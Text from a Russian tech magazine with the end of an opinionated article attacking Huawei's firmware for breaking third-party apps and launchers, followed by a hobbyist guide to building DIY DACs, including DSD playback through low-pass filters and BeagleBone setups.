темы. И если первое обычно ничем пло хим не заканчивается, разве что при‐
ходится привыкать к новому UI, то вто рое может привести к катастрофичес‐
ким последствиям.
   Пользователи Huawei наблюда ют эти последс твия ежедневно. Особая
гордость и непременный аргу мент любого поклонника Huawei в том, нас коль‐
ко дол го их телефон живет от одного заряда батареи. Смартфон действи‐
тельно может ставить рекорды, и с точки зрения рядового пользователя
это существенный плюс. А вот с точки зрения раз работчика приложений
и юзера, которому нужно нечто больше, чем вконтактик, — ужасная головная
боль.





  Сравнительный тест времени жизни от батареи. Источник:
  www.anandtech.com

Дело в том, что в штате Huawei нет магов, а если решать проблему слишком
непродолжительной жиз ни смартфона от батареи без магии, то остается
один вариант — запретить все, что связано с фоновой активностью. Китайцы
любят этот подход. Он прост в реализации и эффекти вен: ты запрещаешь
приложениям перезапус кать ся, будить друг дру га, отправлять друг другу
сообщения, просыпаться, пока экран телефона выключен, — и проблема
решена. А вместе с ней решена проблема нормальной жизни пользователя:
будильники и напоминания перес тают сра батывать, уведомления приходят
с большой задержкой, часть функций приложений просто отваливается.
   Да, твой WhatsApp продолжит нормально работать. Но не потому, что он
так хорош, а потому, что в прошивках почти всех китайских смартфонов есть
белый список приложений, на которые ограничения либо не распространяют‐
ся вовсе, либо распростра няются частично. И проблема здесь в том, что
в него включают исключительно популярный софт. Если ты решишь уста‐
новить  какой‐нибудь  Delta  Chat — он не  будет  работать  корректно.
И жаловаться ты пой дешь к раз работчикам Delta Chat, а не к Huawei.


             INFO

                   В свое время пользовате ли Huawei настолько
                      надоели жалобами разработ чикам VLC, что тем
                      не осталось иного выбора, кроме как заблокиро‐
                         вать установку приложения на половину моделей
                     смартфонов этой компании.



КИТАЙСКИЙ КОД
Конечно же, в глубине настроек в прошивках Huawei есть опции, чтобы отклю‐
чить механизмы, подавляющие фоновую активность приложе ний. Вот только
отключают они далеко не все. Тебе не составит особого труда сделать так,
чтобы система не замораживала работу приложений после отключения экра‐
на, но ты не сможешь отучить ее оста навливать срабаты вание Alarm’ов, отби‐
рать у приложения WakeLock’и и бло кировать переда чу интентов между при‐
ложениями.
   Если тебе эти слова ничего не говорят, я прос то скажу, что все это может
сломать такие приложения, как будиль ники, таймеры, приложения с поддер‐
жкой плагинов, приложения, которые периодически обновляют какую‐то
информацию и выполняют другие действия через определенные промежутки
времени. И все это распростра няется на любой софт не из белого спис ка.
   Да, условные Xiaomi и Samsung тоже встраивают в свои прошивки системы
подавления фоновой активности. Вот только в Xiaomi всю эту требуху таки
можно отключить пол ностью, а в самсунгах она реализована как часть стан‐
дартного механизма энергосбережения Android и работает нас только акку‐
ратно, что ее действие даже не замеча ешь. И да, я не фанат Samsung, я раз‐
работчик, который регулярно запускает тес ты про изводительнос ти на разных
смартфонах.
  Приведу еще один интерес ный пример. Как ты думаешь, что сде лает про‐
шивка Huawei, если приложение захочет быстро завершить само себя?
В документации Android на этот счет есть вполне четкое объ ясне ние: при‐
ложение завершит работу (сюр приз!). Но программисты из Huawei плевать
хотели на официальную документацию. Они покажут пользовате лю окно
с сообщением о том, что приложение чуть не сломало телефон (!), и пореко‐
мендуют его удалить. Удалить, Карл! И я бы даже ничего не сказал, если бы
это было результатом очередной «оптимизации». Но такое поведение явно
говорит о другом — что разработчики Huawei не понимают концепцию кодов
возврата.





  О да, бедный телефон едва не умер от действий злобного приложе ния

И если уж мы заговорили о профнепри годности, вот еще один пример.
В Huawei есть несколь ко встроенных виджетов рабочего стола. Они красивые
и замечательные, но обла дают одной очень интересной особенностью —
некоторые из них крашат сторонние лаунчеры. Ты добавляешь виджет
на рабочий стол, и рабочий стол завершает свою работу с ошибкой. Фанаты
Huawei искренне полагают, что проблема в лаунчерах, и, конечно же, отправ‐
ляют жалобы их авторам.
  Настоящая проб лема, разумеется, в другом. Встроенные в Huawei вид‐
жеты требуют, чтобы разрешение на дос туп к нужным им функциям имел
лаунчер, а не приложение, которому принадлежит виджет. Еще раз: виджет
требует от лаунчера наличие нужного виджету разрешения. С точки зрения
архитектуры ПО такой бред мог запрограммировать только вусмерть пьяный
бомж, которому на голову упал Кирпич Тупос ти. И это при условии, что бомж
родил ся тупым.
   Кстати, о лаунчерах. Как ты думаешь, что это за безумная цепочка слов:
«Настройки → Приложения → Настройки → При ложе ния по умолчанию →
Настройки → Диспетчер»? Это инструкция, как открыть окно выбора лаунчера
по умолчанию в смартфонах Huawei. Нет, не дис петчера памяти, дис петчера
задач или диспетчера транспорта, а рабоче го сто ла! Шесть абсолютно
неочевидных слоев настроек надо пройти, чтобы выб рать лаунчер. А когда ты
это сделаешь, система сбросит настройку при любом удобном случае, нап‐
ример после показа того самого сообщения с рекомендацией удалить при‐
ложение.
  Вообще, нелюбовь к сторонним лаунчерам свой ственна всем китайским
производителям. Ведь совместимость сво их наполненных костылями про‐
шивок приходится обеспечивать не только с собственным лаунчером, но и
со всеми остальными рабочими столами. Например, кривая система кло‐
нирования приложе ний и еще более кривая система теминга в Xiaomi при‐
водят к тому, что сторон ние лаунчеры не могут адекватно показывать иконки
приложений и запускать кло ны (и да, в прес ловутом самсунге и с клонами, и с
темами все хорошо).
  Возвращаясь к Huawei, добавлю также про агрессивную систему управле‐
ния памятью, которая нередко приводит к визуальным глитчам в сторонних
приложениях. Вместе с упомянутой системой подавления фоновой активнос‐
ти она превращает использование смартфона в довольно‐таки мучительное
занятие.
  Все это я оценил на собственной шку ре и со всей серьезностью утвер‐
ждаю: только человек, не пользующийся сторонним соф том или не видевший
в своей жизни ничего, кроме китайских смартфонов, может наз вать исполь‐
зование смартфона Huawei хорошим экспириенсом. А самое смешное, что
Huawei даже не оставляет ему шанса попробовать стороннюю прошивку,
намертво блокируя загрузчик и не предоставляя никаких возможностей его
разблокировать. Ну и чтобы добить бедного юзера, Huawei кладет болт
на обновление своих младших моделей смартфонов, ломает совместимость
с Treble, пачками пропускает патчи безопас ности, встраивает в смартфоны
бэкдоры, регулярно врет в рекламных роликах и пресс‐релизах.
  Просто представь: ты покупаешь ноутбук с какой‐то непонятной версией
Windows с собственной неотключаемой темой интерфейса. Приложения
в ней работают не так, как в оригинальной Windows, патчи для нее выходят
нерегулярно, а обновления порой неизвестно, выйдут ли вообще. И вот когда
ты, наглотавшись всего этого дерьма, решаешь снес ти эту непонятную винду
и поставить на ее место нормальную честно куп ленную Windows, произво‐
дитель сообщает тебе, что это невоз можно.
  Сюр, бред, сумасшествие? Но именно это получают пользователи Huawei.
И хотят еще.


ВЫВОДЫ
Для чего я все это пишу? Для того, что бы пользователи этих чудо‐телефонов
все‐таки не сильно обижались на ведущего нечестную игру Трампа. Huawei
начала вести нечестную игру задолго до него и успела испортить жизнь очень
многим разработчикам. Тем самым разработчикам, которые хотели выпус‐
кать хороший продукт, а не сидеть бес сонными ночами перед монитором,
пытаясь понять, почему их приложение прекрасно работает на всех телефо‐
нах, кроме Huawei.
GEEK





     Mak2k2
    mak2k2@ya.ru

НЕ ПУСТОЙ
ЗВУК

    КАК СОБРАТЬ СОБСТВЕННЫЙ
      ЦИФРОАНАЛОГОВЫЙ
       ПРЕОБРАЗОВАТЕЛЬ




Эта статья поможет тебе собрать свой первый — а может,
уже не первый? — цифроаналоговый преобразователь.
В твоем распоряжении будет несколько кон цептов, как клас‐
сических, так и весьма радикальных. Выбирай сам, что тебе
по душе. Будет пара вариантов даже для тех, кто не дружит
с паяльником!


Однозначно правильного способа сборки цифроаналоговых преобразова‐
 телей не существует, потому что нет общей парадигмы. Есть только наборы:
 подходов, методов, школ и философий — и все это, по сути, наборы сте‐
 реотипов.
   Я расскажу о своем личном опыте, но опишу лишь основные моменты. Я
 не буду касаться реализации питания, усилителей, акус тики и так далее —
 это уже дело вкуса.
   Если захочешь повторить эксперименты, обрати внимание на пре дуп‐
 реждение.


            WARNING

                      Автор и редакция не дают никаких гарантий и не
                         несут ответственности за любой вред, причинен‐
                     ный  во  время  попыток  повторить  описанное
                        в  статье.  Все,  что ты делаешь, ты делаешь
                       на свой страх и риск! Хотя все схе мы проверя‐
                        лись  на  практике,  они намеренно  упрощены
                      и пред ставляют собой пример для объяснения
                       принципа работы, а не закон ченное изделие.



PCM DAC (ИКМ ЦАП)
Обычно звуковой тракт можно раз делить на три час ти:
 • источник;
 • I2S‐преобразователь (конвертер);
 • I2S‐ЦАП.





Источник
В  качестве  источника может выступать компьютер,  планшет, телефон
 или микрокомпьютер вроде Raspberry Pi. В отдель ных случаях источник и кон‐
 вертер могут быть выполнены в одном устройстве — это проигры ватели
 с выходом I2S или микрокомпьютеры.


I2S-преобразователь (конвертер)
Преобразователи I2S могут подклю чать ся к источнику с помощью разных
 интерфейсов: USB, S/PDIF, LAN. Есть еще вари ации с Bluetooth, но нас они
 не интересуют, потому что высокого качества в такой системе не добиться.
 Скорость передачи данных Bluetooth очень мала, о Hi‐Res (192 × 24, DSD)
можно забыть сразу. Но даже при прос лушивании MP3 (44,1 × 16), циф ровой
 поток проходит через нес колько цифровых фильтров, к тому же с обрезкой
 частоты звукового сигнала.
   Кстати говоря, то же относится и к блютусным наушникам. Дело ухуд шает‐
 ся тем, что в наушниках из‐за малого размера сложно разместить полноцен‐
 ный ЦАП и питание к нему, поэто му, как правило, используют «уре занные»
 версии.


        WWW

                     Подробно о передаче  звука по  Bluetooth ты
                    можешь прочитать в статье «Аудио через Blue‐
                             tooth:  максимально  подробно  о  профилях,
                         кодеках и устройствах».



USB
Самый распространенный вариант преобразователей I2S — кон верте ры
USB — I2S.





 Все просто: подклю чаем к порту USB источника, устанавливаем драйвер
 и при проигрывании на выходе I2S получаем поток данных PCM или DSD.
В операционной системе конвертер определя ется как звуковое устройство
 или звуковая карта. Предложений конвертеров USB — I2S огромное количес‐
 тво, те же AliExpress или eBay выдадут вам десят ки вариантов по запросу usb
 to i2s.


 S/PDIF
Множество коммерческих — проприетарных — ЦАП подключаются через
 разъем S/PDIF.
   Не так давно S/PDIF был популярным интерфейсом и встречал ся почти
 в каждой звуковой карте, даже в самых дешевых, встроенных в материнские
 платы ПК. Но не все знают, что почти всегда S/PDIF — это промежуточное
 звено и используется чаще в роли транспорта. Либо у источника, либо у ЦАП
 в большинстве случаев S/PDIF подключен через I2S. Другими словами, сиг‐
 нал передается не напрямую, а вна чале конвертируется из I2S в S/PDIF,
 а потом обратно.
   Не берусь называть кон крет ные цифры, но считается, что потери при кон‐
 вертации и передаче имеются. Кроме того, у S/PDIF есть и дру гие недос‐
 татки — скорость передачи и стоимость. Самые дешевые DIY‐устройства
USB to S/PDIF стоят около 4000 руб лей, а передавать по ним возможно мак‐
 симум PCM 192 × 24 или DSD64 через DOP.
   Таким образом, использовать S/PDIF нецелесооб разно, если есть другие
 варианты.


LAN
 Теперь рассмотрим подключение I2S‐конвертера по LAN (локальной сети).
 Для этого используются специальные программные пле еры: Squeezelite, HQ‐
 Player, Roon и другие. Они устанавлива ются на основной компьютер, который
 выступает в роли передат чика (источника). При воспроизведении выполняет‐
 ся распаков ка, декодирование  и, если требуется, обработка цифрового
 потока. Далее цифровой аудиопоток через определенный сетевой протокол
 передается на приемник — чаще всего микрокомпь ютер. Далее микрокомпь‐
 ютер либо сам конвертирует полученный поток в I2S, либо передает поток
 на конвертер, подключенный к нему по USB. Существу ют и самодельные
 решения, основанные, например, на микрокомпь ютерах BeagleBone black
 или Raspberry Pi, и серийные решения раз личных про изводителей.





 Часто встре чаются устройства, которые объединяют в себе одновременно
 источник и конвертер, конвертер и ЦАП или сразу все в одном устройстве.


I2S-ЦАП
Цифроаналоговых преобра зователей с входом I2S огромное количество. Мы
 не будем рассматривать полностью соб ранные серийные ЦАП; нас больше
 интересуют самоделки. Самый простой и дешевый способ послушать тот
 или иной ЦАП — купить готовую самодельную плату с ЦАП. Можно поискать
ЦАП без питания и предусиления, если захочешь допилить самос тоятельно.
 Для первого раза можно взять что‐нибудь прос тенькое и дешевое, как плата
 на чипе PCM5102A на фото.





     Самодельная плата на чипе PCM5102A компании Texas Instruments

В качестве конвертера в моем случае будет Amanero компании Amanero
 Technologies.





 Все необходимое для PCM5102A мож но подать прямо с конвертера:
 питание — VIN соединить с контактом 3,3 В, землю GNG c землей конвертера
GND, LCK c контактом FSCLK конвертера, DIN c DATA, BCK c BCLK. А вот SCK
 и MCLK в PCM5102A соединять не обя зательно, он сможет работать и без
 дополнительной синхронизации. Но для повышения точности, если есть такая
 возможность, MCLK лучше все же подключать. Аналогичным образом этот
ЦАП можно подсоединить и к Raspberry Pi.





 Как видишь, все просто и специальных знаний не требуется! Подобным обра‐
 зом к I2S можно подключить и другие цифроана логовые преобразователи.
 Для воспроизве дения через USB подойдут практичес ки любые пле еры.
На Raspberry Pi новичкам можно посоветовать Volumio, а более продвинутым
 слушателям сборку с Album Player.
   Для начинающих этой информа ции хватит, особенно для первого раза.
 Для тех же, кто не боится трудностей, продолжу повествование, уровень
 сложности будет возрастать.


DSD-ЦАП
 Изучим на практике способы передачи и вос произведения DSD.
   Обычно  поток данных DSD  в самодельных  устройствах передается
 от источника к цифроаналого вому преобра зова телю через I2S‐конвертер.
 Далеко не все конвертеры поддерживают DSD, поэтому перед покупкой обя‐
 зательно нужно удостовериться, что в спецификациях указана поддержка
 DSD. Самые дешевые конвертеры USB to I2S с поддержкой DSD — это пре‐
 образователи Amanero или их копии, а также конвертеры с применением про‐
 цессоров XMOS.
   Нужно учесть, что не все плееры поддержи вают воспроизве дение DSD
 и не все драйверы в сос тоянии передать чистый DSD (DSD native), даже если
 плеер на это способен. Огра ничение драйвера можно пре одолеть, используя
DOP (DSD over PCM), соответс твенно, плеер тоже должен иметь возможность
 преобразования DSD в DOP.
   В случае Amanero и XMOS поток DSD передается к ЦАП по тем же выходам
 I2S: DATA передает данные правого  канала, LRCK — данные  левого,
 а BCLK — битовую синхро низацию этих данных.
   Воспроизвести поток DSD мож но раз ными способами, стоит выделить
 три:
 • проприетарные ЦАП;
 • через ФНЧ;
 • самодельные ЦАП.


Проприетарный ЦАП
 Большинство коммерчес ких ЦАП, которые поддерживают воспроизве дение
 DSD, принимают и PCM, и DSD через один и тот же разъ ем I2S. В этом случае
 достаточно подключить контакты конвертера и ЦАП способом, описанным
 выше, и переключение между PCM и DSD будет работать автоматичес ки.
 Бывают отдельные входы для DSD, но это реализовано для раздельного под‐
 клю чения устройств, использовать их в большинстве случаев не обязательно.


Воспроизведение через ФНЧ
 Этот способ подкупает своей прос тотой и, кста ти, неплохим зву чанием. Суть
 его, как понятно из названия, заключается в воспро изведении DSD напрямую
 через фильтр нижних частот, без использования какого‐либо циф роаналого‐
 вого преобразователя. Когда я узнал об этом способе впервые, отнесся
 скептически, но оказалось, что звучит такой вари ант лучше, чем все ЦАП,
 которые я слушал до этого. Не хочу никого убеждать, но сам я теперь вряд ли
 вернусь к проприетарным цифроаналоговым преобра зователям.
   Единственная проб лема: контента, доступного в DSD, значительно мень‐
 ше, чем в Audio CD. Но тут нас спа сет конвертация PCM в DSD — она может
 выпол няться как заранее, перед прос лушива нием, так и в реальном времени.
 Делать это можно на ПК или мобильных девайсах с iOS и Android, а в качестве
 передатчика будет выступать I2S‐конвертер.


Принцип работы
В формате DSD используется плотностно‐импуль сная модуля ция, на выходе
 I2S рядом стоящие положитель ные импульсы (логические единицы) скла‐
 дываются в один продолжительный по времени импульс, и напряжение рас‐
 тет. Отсутствие положительных импульсов приводит к падению напряжения.





Поток логических единиц и нулей последова тельный, так что, если подклю‐
 чить выход одного из каналов DSD к фильтру ниж них частот и убрать пос тоян‐
 ную составляющую, мож но получить модулированный сигнал, который, в свою
 очередь, можно подать на вход усилителя. Подоб ным образом преобразовы‐
 вали цифровой поток в ана логовый сигнал однобитные сигма‐дельта‐циф‐
 роаналоговые преобразова тели.


Выбор фильтра
В качестве фильтра нижних частот может выступать простая RС‐ или RL‐цепь,
 а для удаления постоянной сос тавляющей сигнала достаточно обычного кон‐
 денсатора.





 Рассчитать такие фильтры просто. RC (сопротивление, емкость) рас счи тыва‐
 ется по формуле f = 1/2πRC, RL (сопротивление, индуктивность) — по фор‐                    c
 муле f = R/2πL, где f — частота среза фильтра, ее лучше выбирать в диапа‐       c               c
 зоне от 25 до 50 кГц. Для удобства можно исполь зовать он лай новый каль‐
 кулятор.
   Емкость конденсатора (на схеме справа) для удаления постоянной сос‐
 тавляющей рассчитывается как RC ФВЧ — фильтр верхних час тот.





По формуле f = 1/2πRC, где в качестве соп ротивления выступает перемен‐               c
 ный резистор на входе усилителя (предусилителя). Соответственно, R будет
 равно номинальному сопротивлению это го резистора. Емкость конденсатора
 нужно выбрать такую, чтобы час тота среза не превышала 30 Гц. Можно также
 воспользоваться специальным калькулятором.
   Важный момент: для нормального вос произведения необходим фильтр
 с хорошей крутизной среза, ина че высокочас тотные составляющие сигнала
 могут привести к интермодуляционным искажени ям и перегрузке усилителя
 (предусилителя). Для увеличения крутизны среза используют фильтры нес‐
 кольких порядков.
   Выбор порядка фильтра и частоты среза будет во многом зависеть от уси‐
 лителя (предусилителя). Например, для многих транзисторных усилителей
ФНЧ первого порядка будет недостаточно, и это приведет к шумам и иска‐
 жениям. А для ламповых усилителей ФНЧ первого порядка может быть впол‐
 не достаточно.
   В выборе фильтра важ но, как усилитель реагирует на высокие частоты.
Определить это можно, меняя порядок фильтра и час тоту среза. Необходимо
 будет искать компромисс между «зву чанием» и уровнем искажений. При сре‐
 зе ФНЧ ниже 20 кГц силь но ухудшается качес тво звучания, при слишком
 высоком срезе может появиться шум или эффекты перегрузки. На каких‐то
 усилителях достаточ но будет фильтра пер вого порядка и частоты сре за в 40–
 50 кГц, а на других придется использовать ФНЧ второго‐третьего порядка
 и понижать частоту среза до 25 кГц. Чем ниже час тота сре за ФНЧ, тем боль‐
ше влияния на сигнал он оказывает, потому что уровень сигнала падает пос‐
 тепенно, затрагивая и дру гие час тоты еще до выб ранной частоты среза. Под‐
 робнее можно прочитать в работе по ФНЧ.


DIY-ЦАП
Наконец мы добрались до собственноручной сборки ЦАП с минимальными
 затратами. Кон цепции будут расположены от самого прос того варианта
 к более сложному.


Предусиление
При прослушивании через ФНЧ может понадобить ся усилить низкий уровень
 громкости. Если усилитель недос таточно мощный или ты хочешь слушать
 музыку через наушники без подключения к уси лителю, тебе понадобится пре‐
 дусилитель. Посмотрим, какие быва ют варианты.


Стационарный вариант
 Для стационарного варианта лучше всего себя зарекомендовали повыша‐
ющие входные трансформаторы, нап ример такой, как на фото.





Они увеличивают напряжение сигнала примерно в четыре раза, их можно
 подклю чить к балансному вхо ду‐выходу, диапазон вос производимых час‐
 тот 20 Гц — 20 кГц. Сто имость примерно 2000 руб лей за пару; это одни
 из самых дешевых трансформаторов, но свою задачу они выпол няют.
   У способа усиления с помощью трансформаторов, конечно, есть и недос‐
 татки.
   Во‐первых, цена: эти трансформаторы дешевые, но, если ты захочешь
 более качествен ный вариант, он может обойтись уже в десятки раз дороже.
   Во‐вторых, трансформаторы усиливают лишь напряжение, поэтому сами
 по себе их использовать нельзя, только в связке с усилителем.
   Для  использования  необходимо  убрать  пос тоянную  сос тавляющую,
 для этого на вход трансформатора нужно последова тельно подключить кон‐
 денсатор. Причем конденсатор должен быть боль шой емкости, пос кольку
 именно кон денсатор и входное сопротивление трансформатора формиру ют
 фильтр высоких частот.
   Для расчета емкости конденсатора нуж но взять сопротивление трансфор‐
 матора, в данном случае 600 Ом, и подста вить в формулу f = 1/2πRC; частоту                                                              c
 среза  следует  выбирать  минимальную. Я  использовал  конденсаторы
 на 22 мкФ, частота среза получилась око ло 12 Гц.
   Старайся использовать качественные конденсаторы с низ ким значением
 ESR. Дело в том, что они могут ока зать силь ное влияние на сигнал, а ведь он
 будет проходить напрямую через них.
   Еще нужно будет использовать ФНЧ, чтобы убрать высокочастотный шум.
 Здесь должно хватить фильтра первого порядка. Трансформаторы име ют
 определенную полосу пропус кания, и при совмес тном использовании с ФНЧ
 увеличивается крутизна среза. С трансформатором логичнее все го исполь‐
 зовать RL‐фильтр (сопротивление, индуктивность), в котором в качестве соп‐
 ротивления R будет выступать входное сопротивление трансформатора, а в
 качестве  индуктивности —  катушка  индуктивности,  в  данном  случае
 2,2–2,7 мГн (миллиген ри).





Индуктивный фильтр можно рассчитать калькулятором.
   Такой способ предусиления хорошо подходит для стационарного исполь‐
 зования, но носить с собой трансформаторы и усилитель, пусть даже неболь‐
 шого размера, вряд ли кому‐то захочется. Давай рас смотрим, как можно соб‐
 рать переносное устрой ство, которое легко поместится в карман.


                                      Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
     НЕ ПУСТОЙ ЗВУК
                       КАК СОБРАТЬ СОБСТВЕННЫЙ
           ЦИФРОАНАЛОГОВЫЙ ПРЕОБРАЗОВАТЕЛЬ





Портативный вариант
Для портативного вари анта лучше всего подой дет предусилитель на мик‐
росхеме с однополярным питанием не более 5 В. Чтобы пойти по пути
наименьшего сопротивления, в прямом и перенос ном смыс ле, хорошо бы
собрать все в одном: активный ФНЧ и предусилитель на операционном уси‐
лителе. Подобрать и рас считать такой филь тр можно и вручную, но проще
всего использовать онлайн‐приложения для расчетов, например Analog Filter
Wizard компании Analog Devices или Filter Design Tool, предоставленный ком‐
панией Texas Instruments. Веб‐приложения просты в обращении, тебе нужно
указать сле дующие параметры:
 • тип фильтра — Low Pass;
 • усиление, Gain — можно задать в вольтах, оно не должно превышать зна‐
   чения питания;
 • Passband — нужная частота среза;
 • параметр Stopband нуж но задать таким обра зом, чтобы получился фильтр
   второго порядка — 2nd order, ина че придется использовать два и более
   операционных усилителя;
 • напряжение питания +Vs — 3–5 В, ‐Vs — 0 В.

Исходя из характеристик, выбирай микросхему, для которой будут произво‐
диться расчеты. Готово!
  Я использовал Analog Filter Wizard, и у меня получи лась следующая схе ма.





Спецификации
 • Напряжение питания (supply voltage): +Vs: 3 В; ‐Vs: 0 В
 • Усиление (Gain): 3 В/В
 • По лоса про пускания (Passband): –3 дБ при 35 кГц
 • По лоса подавления (Stopband): –40 дБ при 500 кГц

Если ты не любишь паять или не разбира ешься в электротехнике, можешь
купить готовый предусилитель с филь тром, например на AliExpress.





Но придется потратить ся:  таких филь тров нужно две штуки, по одной
на канал. Или можно купить вариант на два канала.





Он рассчитан на балансное подключение, при котором каждый канал переда‐
ется отдельно по трехпроводной схеме: по одно му проводу передается
основной сигнал, по второму проводу этот же сиг нал в противофазе, а третий
провод — это земля. Поэто му подключать нап рямую — не лучшая идея.
Но можно  получить  сигнал  в  противо фазе,  инвертируя  выход DSD
при помощи операционно го усилителя, либо триггера Шмитта, либо логичес‐
кого инвертора.
  Важно получить два идентичных сигнала в противофазе. Даже малейшие
различия будут оказывать значитель ное влияние на выходной сигнал.
  При выборе элементов обязательно нуж но обратить внимание на то,
с какой частотой они могут работать, потому что час тота потока DSD может
варьироваться от 2822,4 до 24 576 кГц. Также настоятельно рекомендую
использовать гальваническую развязку.
   Так реализуется подключение по балансной схеме. В интернете можно
найти и другие варианты готовых филь тров‐предусилителей.


Сборка портативного варианта
Если ты не ищешь легких путей, давай перейдем к сборке.


Железо
В качестве I2S‐конвертера можно использовать следующие платы.
 1. Оригинальный Amanero. Сто имость около 7000 рублей.
 2. Китайская копия, плата ATSAM3U1C XC2C64A. Минимальная стоимость
   «репликанта» около 2000 рублей. Это почти полная копия Amanero,
   основное их отличие в качес тве матери ала самой платы и компонентов.
 3. Платы на основе чипов Xmos. Сто имость от 1700 рублей, принцип под‐
   клю чения будет тот же, но у них высокое энергопотребление.





В качестве фильтра и предусилителя используем AD8656 — операционный
усилитель.





Также понадобятся рас ходники — резисторы и конденсаторы, указанные
в схеме подключения.





                       Схема подключения

В идеале для контактов FSCLK и DATA нужно использовать гальваническую
развязку. Развязку ищи  с запасом по  скорости передачи данных —
от 25 Мбит/с, а напряжение питания развязки выбирай в диапазоне
2,7–5,5 В. Для питания операционного усилителя лучше все го использовать
отдельный  малошумящий  ста билизатор  напряжения. На  входе можно
добавить сопротивление для огра ничения уровня сигнала, а на выход
добавить ФНЧ. Вот и все!
  Получившееся устройство не занимает много места, и его можно подклю‐
чить через OTG к телефону или планшету.


Софт
Драйверы для Windows для Amanero и китай ской реплики (ATSAM3U1C
XC2C64A) можно скачать с сайта Amanero. В Linux и Android драйверы не нуж‐
ны, на iOS, веро ятно, тоже.
  Для мобильных устрой ств существуют десятки плееров с поддержкой Hi‐
Res PCM. Однако через фильтр можно слушать только DSD, поэтому необ‐
ходима конвертация PCM в DSD. К счастью, есть плеер, который конверти‐
рует в реальном времени, — Onkyo HF Player. Этот пле ер из MP3 и FLAC
может конвертировать в DSD64 и 128. При помощи Onkyo HF Player ты
можешь слушать практически любую музыку через простой ФНЧ. Жаль,
конечно, что пле ер не бесплатен: для Android он стоит 699, а для iOS —
749 рублей.
  Воспроизведение DSD через ФНЧ выигрыва ет по сравнению с классичес‐
ким способом воспроизведения через ЦАП.
   Во‐первых, звук получа ется гораз до лучше, чем на многих ЦАП.
  Почему так? Основная составная часть дельта‐сигма‐ЦАП — это циф‐
ровая обработка сигнала. Представь сложный цифровой фильтр с многок‐
ратным оверсемплингом, модулятором 5–7‐го порядка с dithering или noise
shaping. Тут тре буется серь езная вычислительная мощность, которая в ЦАП
ограничена, тогда как в современных про цес сорах для смартфонов она
в разы больше. Соответственно, на смартфоне можно реализовать более
качественную цифровую филь тра цию и модуляцию.
  Почему производители не добавляют мощ ные процессоры в ЦАП —
загадка! Может,  экономят, а может,  счи тают,  что обработкой должно
заниматься отдельное устройство. Нап ример, Asahi Kasei Microdevices (AKM)
выпускают отдельно DSP, которые выполняют конвертацию, в том числе c
оверсемплингом, — и отдельно ЦАП с режимом bypass.


             INFO

                       Чтобы освежить в памяти термины и теорию,
                      смот ри мою прошлую статью о цифровом звуке.


Во‐вторых, воспроизведение DSD через ФНЧ сущес твенно экономит деньги,
ведь стоимость хорошего ЦАП, даже китайского, будет гораздо выше.


Итого
Плюсы
 • Такое устройство легко сделать самому, даже если ты начинающий ради‐
  олю битель.
 • Есть возможность подключения к мобильным устройствам.
 • Стоимость от 2000 рублей.
 • На телефоне с батареей в 3200 мА ⋅ ч этот самодельный ЦАП проработал
   больше шести часов в режиме прослушивания с конвертацией PCM —
  DSD в реальном времени.
 • Звук, по моим ощущени ям, лучше мно гих топовых ЦАП.


Минусы
 • Выход одноуровневый, поэто му шум будет коррелирован с основным сиг‐
   налом. При слабом уровне сигнала возможны небольшие искажения.


Сборка стационарного варианта
Этот вариант будет гораздо слож нее в реализации, но оно того стоит.


Железо
Наилучший результат даст использование BeagleBone black или Beagle-
Bone green в качестве I2S‐конвертера.





BeagleBone — единственный микрокомпь ютер, для которого есть откры тый
драйвер с поддержкой подключения внешнего генератора тактовой частоты.
К внешнему генератору можно подключить как сам конвертер, так и ЦАП,
если он есть. Это позволит снизить количество ошибок при передаче данных
по I2S. А еще мы можем сами выбирать, какого качества и какой частоты
генератор использовать.
  ЦАП для прослушивания DSD в этом вари анте не тре буется. Но важно
подклю чение качественных генераторов 45 158,4 и 49 152 кГц при воспро‐
изведении DSD 256, 512, потому что час тота однобитного сигнала будет
очень высокой — 11 289,6 и 22 579,2 кГц соответственно. Частота тактового
генератора MCLK дол жна быть хотя бы вдвое боль ше час тоты передаваемых
данных, иначе могут возникнуть ошибки при передаче.


Внешний клок
Первое, что тебе пот ребуется, — внеш ний генератор тактовой частоты,
в простонародье «клок». У тебя, как обычно, два пути: если ты дру жишь
с паяльником, можешь собрать его самос тоятельно, если нет — купить
готовое решение.
   У Павла Погодина есть проект DSC — ЦАП под откры той лицензией.
На сайте выложе на документация к ЦАП Павла, там же ты найдешь схему рек‐
локера для BeagleBone. В этой схеме реализова но подключение внешних
клоков и автоматическое переключение их под частотные сетки 44,1/48.
Можешь взять ее за основу и собрать нечто похожее.





Эта плата разработана для воспро изведения как PCM, так и DSD, но если
тебя, как и меня, интересует исклю читель но воспроизве дение DSD, то можно
обойтись только следующей частью схемы.





             INFO

                     Все названия элементов и номиналы указаны
                        в документации (PDF).


И конечно, самый простой, но зат ратный способ — купить готовые генера‐
торы.





  Самые дешевые из более‐менее приемлемых генераторов выглядят так

Чтобы генератор автоматичес ки переключался под частотные сетки 44,1/48,
придется  все‐таки  взять  в  руки  паяльник  и  распаять  селектор U7
(74AUP2G157) указанный на схеме выше, — иначе генераторы надо будет
переключать вручную. Нап ример, для прослушива ния CDDA, MP3 и DSD пот‐
ребуется только генера тор 45 158,4 кГц, но, если ты захочешь слу шать
«винилрипы» с частотой дискретиза ции 96 и 192 кГц, понадобится уже
генератор 49 152 кГц.
  После подключения генератора к BeagleBone black (контакт P9_25) оста‐
нется только вывести два канала DSD (контакты P9_30, P9_41).





Номера контактов указаны для дистрибути ва mini Botic7 (архив), собранного
Павлом Погодиным. К контактам DSD1 и DSD2 нуж но подключить фильтр,
и устройство будет готово к работе.


Софт
Теперь поговорим о программной части. Начнем с драй вера.
  Для BeagleBone black/green существует открытый драйвер, написанный
участником форума diyaudio.com под ником Miero.
   У драйвера немало настроек, все они описаны на сайте. Менять их можно
в конфиге /boot/uEnv.txt. Например, можно задать вывод PCM и DSD
на разные контакты, длину  кадра LRCLK  (актуально для мультибитов)
или определенную частоту генератора тактовой частоты.
  В нашем случае менять ничего не придется. Нужно только скачать прошив‐
ку для BeagleBone black (архив), в ней уже имеется этот драйвер. Скачанную
прошивку записываем на карту microSD при помощи, например, программы
dd в Linux или Rufus в Windows. Затем вставляем карту в разъ ем на мик‐
рокомпьютере, зажимаем кноп ку рядом с этим разъемом и под ключаем
питание. Через несколько секунд кнопку можно отпускать. Плата должна
начать загрузку, весело мигая светодиода ми.
  По умолчанию будет загружен профиль с клиентом для HQPlayer, именно
он нам и нужен. Также прошивку можно ско пиро вать во внутреннюю память
BeagleBone black, инструкции есть на сайте Павла Погодина.
